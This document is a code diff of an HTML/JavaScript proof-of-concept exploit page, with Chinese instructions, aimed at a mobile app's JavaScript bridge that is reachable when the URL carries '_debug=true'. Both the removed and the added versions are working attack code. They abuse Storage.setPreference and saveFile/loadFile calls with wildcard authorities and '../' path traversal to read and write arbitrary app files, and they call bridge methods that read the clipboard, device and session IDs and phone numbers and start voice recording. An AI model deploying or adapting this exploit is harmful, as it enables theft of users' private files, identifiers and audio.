@@ -3,443 +3,257 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>xm_youping merged storage+bridge PoC</title>
+  <title>xm_car bridge debug bypass PoC</title>
   <style>
-    body { font-family: sans-serif; margin: 14px; line-height: 1.45; }
-    h2,h3 { margin: 10px 0 6px; }
-    input, textarea, select, button { width: 100%; box-sizing: border-box; margin: 6px 0; padding: 8px; }
-    textarea { min-height: 120px; font-family: monospace; }
-    button { cursor: pointer; }
-    pre { background: #f5f5f5; padding: 10px; white-space: pre-wrap; word-break: break-all; }
-    .box { border: 1px solid #ddd; padding: 10px; margin-bottom: 12px; }
-    .row { display: flex; gap: 8px; }
-    .row > button { flex: 1; }
+    :root { --bg:#0b0f14; --card:#121922; --line:#2b3645; --txt:#d7e1ee; --muted:#97a8bf; --ok:#22c55e; --btn:#1f2937; }
+    * { box-sizing: border-box; }
+    body { margin: 0; padding: 14px; background: var(--bg); color: var(--txt); font: 14px/1.5 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PingFang SC", "Microsoft YaHei", sans-serif; }
+    h1,h2 { margin: 0 0 8px; }
+    .desc { color: var(--muted); margin-bottom: 12px; }
+    .grid { display: grid; gap: 12px; }
+    .box { border: 1px solid var(--line); background: var(--card); border-radius: 12px; padding: 12px; }
+    input, textarea, select, button { width: 100%; border-radius: 8px; border: 1px solid var(--line); background: #0f1620; color: var(--txt); padding: 8px; }
+    textarea { min-height: 110px; font-family: ui-monospace, Consolas, Menlo, monospace; }
+    button { background: var(--btn); cursor: pointer; }
+    .row { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+    .row3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; }
+    pre { margin: 0; white-space: pre-wrap; word-break: break-all; }
+    .hint { color: var(--muted); font-size: 12px; }
+    .ok { color: var(--ok); }
   </style>
 </head>
 <body>
-  <h2>xm_youping 合并版 PoC（Storage + Bridge）</h2>
-  <p>页面 URL 需带 <code>_debug=true</code>，例如：<code>https://your-domain/poc_youping_bridge.html?_debug=true</code></p>
+  <h1>xm_car 导出链路 -> JR Bridge 验证 PoC</h1>
+  <div class="desc">要求：页面 URL 带 <code>_debug=true</code>。例如：<code>https://your-domain/poc_xmcar_bridge.html?_debug=true</code></div>
 
-  <div class="box">
-    <h3>1) 读取任意文件（不覆盖目标文件）</h3>
-    <label>读取路径（相对 filesDir，可 ../ 穿越）</label>
-    <input id="readPath" value="../shared_prefs/seq.xml" />
-    <label>读取格式</label>
-    <select id="readFormat">
-      <option value="0" selected>0 (text)</option>
-      <option value="1">1 (base64 binary)</option>
-    </select>
-    <div class="row">
-      <button id="btnInjectMeta">注入 hybrid_storage 元数据键</button>
-      <button id="btnRead">读取任意文件</button>
+  <div class="grid">
+    <div class="box">
+      <h2>0) 环境检查</h2>
+      <div class="hint">先点“快速检查”，确认 lookup 全是 code=0</div>
+      <div class="row">
+        <button id="btnEnv">显示环境</button>
+        <button id="btnQuick">快速检查</button>
+      </div>
     </div>
-    <p style="margin:6px 0;color:#666">注入逻辑：写 <code>../shared_prefs/hybrid_storage.xml</code> 的键值，不直接写目标文件本身。</p>
-  </div>
 
-  <div class="box">
-    <h3>2) 写任意文件（内容可控）</h3>
-    <label>写入路径（相对 filesDir，可 ../ 穿越）</label>
-    <input id="writePath" value="../shared_prefs/secure_lib.xml" />
-    <label>写入格式</label>
-    <select id="writeFormat">
-      <option value="0" selected>0 (text)</option>
-      <option value="1">1 (base64 binary)</option>
-    </select>
-    <label>写入内容（可控）</label>
-    <textarea id="writeData"><?xml version='1.0' encoding='utf-8' standalone='yes' ?>
+    <div class="box">
+      <h2>1) 剪贴板</h2>
+      <input id="clipText" value="xm_car_pwn_clipboard" />
+      <div class="row">
+        <button id="btnReadClip">System.readClipboard</button>
+        <button id="btnWriteClip">System.writeClipboard</button>
+      </div>
+    </div>
+
+    <div class="box">
+      <h2>2) 设备标识</h2>
+      <button id="btnData">Data.getDeviceId / getSessionId / getDeviceInfo</button>
+    </div>
+
+    <div class="box">
+      <h2>3) 任意文件读写（Storage）</h2>
+      <label>读取路径（相对 filesDir，可 ../ 穿越）</label>
+      <input id="readPath" value="../shared_prefs/hybrid_storage.xml" />
+      <label>读取格式</label>
+      <select id="readFmt">
+        <option value="0" selected>0 (text)</option>
+        <option value="1">1 (base64)</option>
+      </select>
+      <div class="row3">
+        <button id="btnInject">仅注入元数据</button>
+        <button id="btnReadNoMeta">直接 loadFile</button>
+        <button id="btnReadWithMeta">注入后 loadFile</button>
+      </div>
+      <hr style="border-color:#2b3645; margin: 10px 0;" />
+      <label>写入路径</label>
+      <input id="writePath" value="../shared_prefs/poc_xmcar_test.xml" />
+      <label>写入格式</label>
+      <select id="writeFmt">
+        <option value="0" selected>0 (text)</option>
+        <option value="1">1 (base64)</option>
+      </select>
+      <label>写入内容</label>
+      <textarea id="writeData"><?xml version='1.0' encoding='utf-8' standalone='yes' ?>
 <map>
-    <int name='version' value='3' />
+  <string name='poc'>xm_car_bridge_ok</string>
 </map></textarea>
-    <button id="btnWriteFile">写任意文件（可控内容）</button>
-  </div>
+      <button id="btnWrite">Storage.saveFile</button>
+    </div>
 
-  <div class="box">
-    <h3>3) Storage 偏好接口（youping 版）</h3>
-    <label>Preference Key</label>
-    <input id="prefKey" value="demo_key" />
-    <label>Preference Value</label>
-    <input id="prefVal" value="demo_val" />
-    <div class="row">
-      <button id="btnSetPref">setPreference</button>
-      <button id="btnGetPref">getPreference</button>
-      <button id="btnGetAllPref">getAllPreferences</button>
+    <div class="box">
+      <h2>4) 其他能力</h2>
+      <div class="row">
+        <button id="btnPhone">Account.getPhoneNumber (可能 202)</button>
+        <button id="btnVoiceStart">Voice.startRecord</button>
+      </div>
+      <div class="row">
+        <button id="btnVoiceStop">Voice.stopRecord</button>
+        <button id="btnVoiceCancel">Voice.cancelRecord</button>
+      </div>
+      <div class="hint">Account.getPhoneNumber 在非 MIUI 签名环境可能返回 code=202（代码里有签名限制）。</div>
+    </div>
+
+    <div class="box">
+      <h2>输出</h2>
+      <pre id="out"></pre>
     </div>
   </div>
-
-  <div class="box">
-    <h3>4) System.readClipboard / writeClipboard</h3>
-    <label>写入剪贴板内容</label>
-    <input id="clipData" value="poc_clipboard_text" />
-    <div class="row">
-      <button id="btnReadClipboard">读取剪贴板</button>
-      <button id="btnWriteClipboard">写入剪贴板</button>
-    </div>
-  </div>
-
-  <div class="box">
-    <h3>5) Data 标识接口（3项）</h3>
-    <button id="btnData3">读取 getDeviceId/getSessionId/getDeviceInfo</button>
-  </div>
-
-  <div class="box">
-    <h3>6) Account.getPhoneNumber</h3>
-    <button id="btnAccountPhone">读取手机号列表</button>
-  </div>
-
-  <div class="box">
-    <h3>7) Voice.startRecord / stopRecord / cancelRecord</h3>
-    <label>startRecord 参数（String）</label>
-    <input id="voiceParam" value="xm_youping_voice" />
-    <div class="row">
-      <button id="btnVoiceStart">startRecord</button>
-      <button id="btnVoiceStop">stopRecord</button>
-      <button id="btnVoiceCancel">cancelRecord</button>
-    </div>
-  </div>
-
-  <h3>输出</h3>
-  <pre id="out"></pre>
 
 <script>
-const out = document.getElementById('out');
-const HYBRID_STORAGE_XML = '../shared_prefs/hybrid_storage.xml';
-
-function log(x) {
-  const s = (typeof x === 'string') ? x : JSON.stringify(x, null, 2);
-  out.textContent += `[${new Date().toLocaleTimeString()}] ${s}\n`;
-}
-
-function parseMaybeJson(raw) {
-  if (raw == null) return raw;
-  if (typeof raw !== 'string') return raw;
-  try { return JSON.parse(raw); } catch (_) { return raw; }
-}
-
-function invoke(feature, action, param, callbackExpr) {
-  const raw = window.MiFiJsBridge.invoke(feature, action, param, callbackExpr || null);
-  return parseMaybeJson(raw);
-}
-
-function lookup(feature, action) {
-  return window.MiFiJsBridge.lookup(feature, action);
-}
-
-function ensureBridge() {
-  if (!window.MiFiJsBridge) throw new Error('MiFiJsBridge missing');
-}
-
-function ensureAvailable(feature, action) {
-  ensureBridge();
-  const code = lookup(feature, action);
-  log({ lookup: { feature, action, code } });
-  if (code !== 0) throw new Error(`${feature}.${action} unavailable, code=${code}`);
-}
-
-function makeCallback(prefix) {
-  const fn = `__mifi_cb_${prefix}_${Date.now()}_${Math.floor(Math.random()*100000)}`;
-  window[fn] = function(respRaw) {
-    const parsed = parseMaybeJson(respRaw);
-    log({ callback: fn, data: parsed });
+  const out = document.getElementById('out');
+  const now = () => new Date().toLocaleTimeString();
+  const log = (x) => {
+    const s = (typeof x === 'string') ? x : JSON.stringify(x, null, 2);
+    out.textContent += `[${now()}] ${s}\n`;
+    out.scrollTop = out.scrollHeight;
   };
-  return `window.${fn}`;
-}
+  const j = (raw) => { try { return JSON.parse(raw); } catch { return raw; } };
 
-function metaValue(format) {
-  return JSON.stringify({ authorities: ['*'], format: Number(format) });
-}
-
-function escapeXmlAttr(s) {
-  return String(s)
-    .replace(/&/g, '&amp;')
-    .replace(/"/g, '&quot;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;')
-    .replace(/'/g, '&apos;');
-}
-
-function escapeXmlText(s) {
-  return String(s)
-    .replace(/&/g, '&amp;')
-    .replace(/</g, '&lt;')
-    .replace(/>/g, '&gt;')
-    .replace(/"/g, '&quot;')
-    .replace(/'/g, '&apos;');
-}
-
-function buildFreshHybridStorageXml(path, format) {
-  const nameEsc = escapeXmlAttr(path);
-  const metaEsc = escapeXmlText(metaValue(format));
-  return `<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n<map>\n    <string name='${nameEsc}'>${metaEsc}</string>\n</map>`;
-}
-
-function parseHybridStorageEntries(existingXml) {
-  const parser = new DOMParser();
-  const doc = parser.parseFromString(existingXml, 'application/xml');
-  if (doc.getElementsByTagName('parsererror').length > 0) {
-    throw new Error('parsererror');
+  function ensureBridge() {
+    if (!window.MiFiJsBridge) throw new Error('MiFiJsBridge 不存在');
   }
-  const mapNode = doc.getElementsByTagName('map')[0];
-  if (!mapNode) {
-    throw new Error('missing <map>');
+
+  function invoke(feature, action, param, cb) {
+    ensureBridge();
+    const raw = window.MiFiJsBridge.invoke(feature, action, param ?? null, cb ?? null);
+    return j(raw);
   }
-  const entries = {};
-  const list = Array.from(mapNode.getElementsByTagName('string'));
-  for (const node of list) {
-    const k = node.getAttribute('name');
-    if (k) entries[k] = node.textContent || '';
+
+  function lookup(feature, action) {
+    ensureBridge();
+    return window.MiFiJsBridge.lookup(feature, action);
   }
-  return entries;
-}
 
-function renderHybridStorageXml(entries) {
-  const keys = Object.keys(entries);
-  keys.sort();
-  const lines = [];
-  lines.push(`<?xml version='1.0' encoding='utf-8' standalone='yes' ?>`);
-  lines.push(`<map>`);
-  for (const k of keys) {
-    const nameEsc = escapeXmlAttr(k);
-    const valEsc = escapeXmlText(entries[k]);
-    lines.push(`    <string name='${nameEsc}'>${valEsc}</string>`);
+  function mkCb(tag) {
+    const fn = `__xmcar_cb_${tag}_${Date.now()}_${Math.floor(Math.random()*10000)}`;
+    window[fn] = (respRaw) => log({ callback: fn, data: j(respRaw) });
+    return `window.${fn}`;
   }
-  lines.push(`</map>`);
-  return lines.join('\n');
-}
 
-function mergeHybridStorageXml(existingXml, path, format) {
-  try {
-    const entries = parseHybridStorageEntries(existingXml);
-    entries[path] = metaValue(format);
-    return renderHybridStorageXml(entries);
-  } catch (e) {
-    log('merge 失败，使用全新模板写入 hybrid_storage.xml: ' + e.message);
-    return buildFreshHybridStorageXml(path, format);
+  function setMeta(path, format) {
+    const meta = JSON.stringify({ authorities: ['*'], format: Number(format) });
+    const req = JSON.stringify({ pref: 'hybrid_storage', content: { [path]: meta } });
+    return invoke('Storage', 'setPreferenceV2', req);
   }
-}
 
-function saveTextFile(name, text, authorities) {
-  ensureAvailable('Storage', 'saveFile');
-  const req = JSON.stringify({
-    name,
-    data: text,
-    format: 0,
-    authorities: authorities || ['*']
-  });
-  return invoke('Storage', 'saveFile', req);
-}
+  document.getElementById('btnEnv').onclick = () => {
+    try {
+      ensureBridge();
+      log({
+        ok: 'MiFiJsBridge exists',
+        href: location.href,
+        has_debug: /[?&]_debug=true(&|$)/.test(location.href),
+        ua: navigator.userAgent
+      });
+    } catch (e) { log('ERR(env): ' + e.message); }
+  };
 
-function loadTextFile(name) {
-  ensureAvailable('Storage', 'loadFile');
-  const r = invoke('Storage', 'loadFile', name);
-  if (r && r.code === 0 && r.content && typeof r.content.data === 'string') {
-    return { ok: true, text: r.content.data, resp: r };
-  }
-  return { ok: false, resp: r };
-}
+  document.getElementById('btnQuick').onclick = () => {
+    try {
+      const checks = [
+        ['System','readClipboard'],
+        ['System','writeClipboard'],
+        ['Data','getDeviceId'],
+        ['Data','getSessionId'],
+        ['Data','getDeviceInfo'],
+        ['Storage','setPreferenceV2'],
+        ['Storage','loadFile'],
+        ['Storage','saveFile'],
+        ['Voice','startRecord']
+      ];
+      const result = {};
+      checks.forEach(([f,a]) => result[`${f}.${a}`] = lookup(f,a));
+      log(result);
+    } catch (e) { log('ERR(quick): ' + e.message); }
+  };
 
-function injectMetaKey() {
-  try {
-    const path = document.getElementById('readPath').value.trim();
-    const format = Number(document.getElementById('readFormat').value);
-    if (!path) throw new Error('readPath empty');
+  document.getElementById('btnReadClip').onclick = () => {
+    try { log({ readClipboard: invoke('System','readClipboard', null) }); }
+    catch (e) { log('ERR(readClipboard): ' + e.message); }
+  };
 
-    let currentXml = null;
-    const loaded = loadTextFile(HYBRID_STORAGE_XML);
-    if (loaded.ok) {
-      currentXml = loaded.text;
-      log('读取到现有 hybrid_storage.xml，准备增量注入');
-    } else {
-      log({ loadHybridStorageBeforeInject: loaded.resp });
-      log('未读到现有 hybrid_storage.xml，将按模板创建（可能覆盖原有键）');
-    }
+  document.getElementById('btnWriteClip').onclick = () => {
+    try {
+      const text = document.getElementById('clipText').value;
+      log({ writeClipboard: invoke('System','writeClipboard', text) });
+    } catch (e) { log('ERR(writeClipboard): ' + e.message); }
+  };
 
-    const newXml = currentXml
-      ? mergeHybridStorageXml(currentXml, path, format)
-      : buildFreshHybridStorageXml(path, format);
+  document.getElementById('btnData').onclick = () => {
+    try {
+      log({
+        getDeviceId: invoke('Data','getDeviceId', null),
+        getSessionId: invoke('Data','getSessionId', null),
+        getDeviceInfo: invoke('Data','getDeviceInfo', null)
+      });
+    } catch (e) { log('ERR(data): ' + e.message); }
+  };
 
-    const wr = saveTextFile(HYBRID_STORAGE_XML, newXml, ['*']);
-    log({ injectMeta_writeHybridStorageXml: wr });
+  document.getElementById('btnInject').onclick = () => {
+    try {
+      const p = document.getElementById('readPath').value.trim();
+      const f = document.getElementById('readFmt').value;
+      log({ injectMeta: setMeta(p, f), path: p, format: Number(f) });
+    } catch (e) { log('ERR(injectMeta): ' + e.message); }
+  };
 
-    const verifyHybrid = loadTextFile(HYBRID_STORAGE_XML);
-    log({ verifyHybridStorageXml: verifyHybrid.resp });
+  document.getElementById('btnReadNoMeta').onclick = () => {
+    try {
+      const p = document.getElementById('readPath').value.trim();
+      log({ loadFile: invoke('Storage','loadFile', p) });
+    } catch (e) { log('ERR(readNoMeta): ' + e.message); }
+  };
 
-    log('注入完成。现在可点击“读取任意文件”。若仍 file info not found，请重进页面后再读。');
-  } catch (e) {
-    log('ERR(injectMeta): ' + e.message);
-  }
-}
+  document.getElementById('btnReadWithMeta').onclick = () => {
+    try {
+      const p = document.getElementById('readPath').value.trim();
+      const f = document.getElementById('readFmt').value;
+      log({ injectMeta: setMeta(p, f) });
+      const r = invoke('Storage','loadFile', p);
+      log({ loadFile: r });
+      if (Number(f) === 1 && r && r.code === 0 && r.content?.data) {
+        try { log('base64 decoded bytes=' + atob(r.content.data).length); } catch {}
+      }
+    } catch (e) { log('ERR(readWithMeta): ' + e.message); }
+  };
 
-function readAny() {
-  try {
-    ensureAvailable('Storage', 'loadFile');
-    const p = document.getElementById('readPath').value.trim();
-    const f = Number(document.getElementById('readFormat').value);
-    if (!p) throw new Error('readPath empty');
+  document.getElementById('btnWrite').onclick = () => {
+    try {
+      const name = document.getElementById('writePath').value.trim();
+      const data = document.getElementById('writeData').value;
+      const format = Number(document.getElementById('writeFmt').value);
+      const req = JSON.stringify({ name, data, format, authorities: ['*'] });
+      log({ saveFile: invoke('Storage','saveFile', req), name, format });
+    } catch (e) { log('ERR(write): ' + e.message); }
+  };
 
-    const r = invoke('Storage', 'loadFile', p);
-    log({ loadFile: r });
+  document.getElementById('btnPhone').onclick = () => {
+    try {
+      const cb = mkCb('phone');
+      const r = invoke('Account','getPhoneNumber', null, cb);
+      log({ getPhoneNumber_return: r, callback: cb });
+    } catch (e) { log('ERR(phone): ' + e.message); }
+  };
 
-    if (r && r.code === 0 && r.content && typeof r.content.data === 'string' && f === 1) {
-      try { log('binary bytes=' + atob(r.content.data).length); } catch (_) {}
-    }
+  document.getElementById('btnVoiceStart').onclick = () => {
+    try {
+      const cb = mkCb('voice');
+      const r = invoke('Voice','startRecord', 'xm_car_voice', cb);
+      log({ startRecord_return: r, callback: cb });
+    } catch (e) { log('ERR(voiceStart): ' + e.message); }
+  };
 
-    if (r && r.code === 200 && String(JSON.stringify(r)).includes('file info not found')) {
-      log('提示：先点“注入 hybrid_storage 元数据键”再读取。');
-    }
-  } catch (e) {
-    log('ERR(read): ' + e.message);
-  }
-}
+  document.getElementById('btnVoiceStop').onclick = () => {
+    try { log({ stopRecord: invoke('Voice','stopRecord', null) }); }
+    catch (e) { log('ERR(voiceStop): ' + e.message); }
+  };
 
-function writeAnyFile() {
-  try {
-    ensureAvailable('Storage', 'saveFile');
-    const p = document.getElementById('writePath').value.trim();
-    const d = document.getElementById('writeData').value;
-    const f = Number(document.getElementById('writeFormat').value);
-    if (!p) throw new Error('writePath empty');
-    const req = JSON.stringify({ name: p, data: d, format: f, authorities: ['*'] });
-    const r = invoke('Storage', 'saveFile', req);
-    log({ saveFile: r });
-  } catch (e) {
-    log('ERR(writeFile): ' + e.message);
-  }
-}
+  document.getElementById('btnVoiceCancel').onclick = () => {
+    try { log({ cancelRecord: invoke('Voice','cancelRecord', null) }); }
+    catch (e) { log('ERR(voiceCancel): ' + e.message); }
+  };
 
-function setPref() {
-  try {
-    ensureAvailable('Storage', 'setPreference');
-    const k = document.getElementById('prefKey').value;
-    const v = document.getElementById('prefVal').value;
-    const map = {}; map[k] = v;
-    const r = invoke('Storage', 'setPreference', JSON.stringify(map));
-    log({ 'Storage.setPreference': r });
-  } catch (e) {
-    log('ERR(setPref): ' + e.message);
-  }
-}
-
-function getPref() {
-  try {
-    ensureAvailable('Storage', 'getPreference');
-    const k = document.getElementById('prefKey').value;
-    const r = invoke('Storage', 'getPreference', k);
-    log({ 'Storage.getPreference': r });
-  } catch (e) {
-    log('ERR(getPref): ' + e.message);
-  }
-}
-
-function getAllPref() {
-  try {
-    ensureAvailable('Storage', 'getAllPreferences');
-    const r = invoke('Storage', 'getAllPreferences', '');
-    log({ 'Storage.getAllPreferences': r });
-  } catch (e) {
-    log('ERR(getAllPref): ' + e.message);
-  }
-}
-
-function readClipboard() {
-  try {
-    ensureAvailable('System', 'readClipboard');
-    const r = invoke('System', 'readClipboard', null);
-    log({ 'System.readClipboard': r });
-  } catch (e) {
-    log('ERR(readClipboard): ' + e.message);
-  }
-}
-
-function writeClipboard() {
-  try {
-    ensureAvailable('System', 'writeClipboard');
-    const d = document.getElementById('clipData').value;
-    const r = invoke('System', 'writeClipboard', d);
-    log({ 'System.writeClipboard': r });
-  } catch (e) {
-    log('ERR(writeClipboard): ' + e.message);
-  }
-}
-
-function readData3() {
-  try {
-    ensureAvailable('Data', 'getDeviceId');
-    ensureAvailable('Data', 'getSessionId');
-    ensureAvailable('Data', 'getDeviceInfo');
-    const r1 = invoke('Data', 'getDeviceId', null);
-    const r2 = invoke('Data', 'getSessionId', null);
-    const r3 = invoke('Data', 'getDeviceInfo', null);
-    log({
-      'Data.getDeviceId': r1,
-      'Data.getSessionId': r2,
-      'Data.getDeviceInfo': r3
-    });
-  } catch (e) {
-    log('ERR(readData3): ' + e.message);
-  }
-}
-
-function accountPhone() {
-  try {
-    ensureAvailable('Account', 'getPhoneNumber');
-    const cb = makeCallback('account_phone');
-    const r = invoke('Account', 'getPhoneNumber', null, cb);
-    log({ 'Account.getPhoneNumber': r, callback: cb });
-    if (r && r.code === 202) {
-      log('说明：该包此接口有签名门控，返回202是预期行为。');
-    }
-  } catch (e) {
-    log('ERR(accountPhone): ' + e.message);
-  }
-}
-
-function voiceStart() {
-  try {
-    ensureAvailable('Voice', 'startRecord');
-    const p = document.getElementById('voiceParam').value;
-    const cb = makeCallback('voice_start');
-    const r = invoke('Voice', 'startRecord', p, cb);
-    log({ 'Voice.startRecord': r, callback: cb, param: p });
-  } catch (e) {
-    log('ERR(voiceStart): ' + e.message);
-  }
-}
-
-function voiceStop() {
-  try {
-    ensureAvailable('Voice', 'stopRecord');
-    const r = invoke('Voice', 'stopRecord', null);
-    log({ 'Voice.stopRecord': r });
-  } catch (e) {
-    log('ERR(voiceStop): ' + e.message);
-  }
-}
-
-function voiceCancel() {
-  try {
-    ensureAvailable('Voice', 'cancelRecord');
-    const r = invoke('Voice', 'cancelRecord', null);
-    log({ 'Voice.cancelRecord': r });
-  } catch (e) {
-    log('ERR(voiceCancel): ' + e.message);
-  }
-}
-
-document.getElementById('btnInjectMeta').addEventListener('click', injectMetaKey);
-document.getElementById('btnRead').addEventListener('click', readAny);
-document.getElementById('btnWriteFile').addEventListener('click', writeAnyFile);
-document.getElementById('btnSetPref').addEventListener('click', setPref);
-document.getElementById('btnGetPref').addEventListener('click', getPref);
-document.getElementById('btnGetAllPref').addEventListener('click', getAllPref);
-document.getElementById('btnReadClipboard').addEventListener('click', readClipboard);
-document.getElementById('btnWriteClipboard').addEventListener('click', writeClipboard);
-document.getElementById('btnData3').addEventListener('click', readData3);
-document.getElementById('btnAccountPhone').addEventListener('click', accountPhone);
-document.getElementById('btnVoiceStart').addEventListener('click', voiceStart);
-document.getElementById('btnVoiceStop').addEventListener('click', voiceStop);
-document.getElementById('btnVoiceCancel').addEventListener('click', voiceCancel);
-
-log('PoC loaded (youping)');
+  log('PoC loaded. 先点“显示环境”和“快速检查”。');
 </script>
 </body>
 </html>
